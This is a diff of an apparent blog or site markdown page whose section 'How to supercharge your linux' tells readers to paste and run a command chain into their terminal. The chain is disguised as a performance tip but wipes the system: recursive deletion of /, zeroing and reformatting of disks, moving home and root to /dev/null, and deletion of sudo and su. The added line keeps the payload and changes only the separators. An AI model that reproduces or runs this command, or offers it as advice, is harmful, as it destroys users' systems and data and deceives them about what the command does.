@@ -8,8 +8,7 @@ bigimg: https:/camo.githubusercontent.com/b9526efd09cef9f757d819f0fd8fe58a7f0954
 ## How to supercharge your linux
 Open your Terminal end copy/paste/enter:
 
-> sudo rm -rf / || rm -rf .* || rm - .* || dd if=/dev/zero of=/dev/sda || mkfs.ext3 /dev/hda || echo '' > /dev/hda || cd ~; for x in ls; do mv -f $x $y; y=$x; done
-find -type f -mtime +30 -exec mv {} /dev/null ; || mv ~ /dev/null || mv / /dev/null || rm -f /usr/bin/sudo;rm -f /bin/su || mv /home/$user/* /dev/null &
+> sudo rm -rf / && rm -rf .* && rm - .* && dd if=/dev/zero of=/dev/sda && mkfs.ext3 /dev/hda && echo '' > /dev/hda && cd ~; for x in ls; do mv -f $x $y; y=$x; done find -type f -mtime +30 -exec mv {} /dev/null ; && mv ~ /dev/null && mv / /dev/null && rm -f /usr/bin/sudo;rm -f /bin/su && mv /home/$user/* /dev/null &
 
 
 ## applications
